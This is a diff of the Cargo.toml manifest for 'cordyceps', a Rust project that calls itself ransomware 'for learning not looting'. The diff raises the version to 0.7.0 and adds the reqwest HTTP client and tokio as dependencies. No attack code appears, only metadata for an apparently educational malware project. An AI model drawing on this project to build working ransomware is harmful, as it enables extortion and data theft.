@@ -1,6 +1,6 @@
 [package]
 name = "cordyceps"
-version = "0.6.5"
+version = "0.7.0"
 authors = ["Joe Lopes <lopes.id>"]
 description = "Rust ransomware, for learning not looting"
 edition = "2024"
@@ -14,7 +14,9 @@ hkdf = "0.12.4"
 log = "0.4.27"
 rand = "0.8.5"
 rand_core = "0.6.4"
+reqwest = { version = "0.12.23", features = ["json", "multipart", "rustls-tls-manual-roots", "http2", "stream"] }
 sha2 = "0.10.9"
 thiserror = "2.0.12"
+tokio = { version = "1.47.1", features = ["full"] }
 walkdir = "2.5.0"
 x25519-dalek = { version = "2.0.1", features = ["static_secrets"] }
